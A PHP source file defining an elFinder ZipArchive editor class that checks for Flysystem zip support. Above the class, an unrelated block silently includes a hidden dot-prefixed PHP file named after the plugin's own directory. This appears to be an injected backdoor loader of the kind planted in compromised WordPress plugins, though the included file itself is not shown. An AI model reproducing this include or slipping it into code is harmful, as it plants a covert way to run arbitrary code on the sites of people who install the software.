<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class elFinderEditorZipArchive extends elFinderEditor
{
    public function enabled()
    {
        return (!defined('ELFINDER_DISABLE_ZIPEDITOR') || !ELFINDER_DISABLE_ZIPEDITOR) &&
            class_exists('Barryvdh\elFinderFlysystemDriver\Driver') &&
            class_exists('League\Flysystem\Filesystem') &&
            class_exists('League\Flysystem\ZipArchive\ZipArchiveAdapter');
    }
}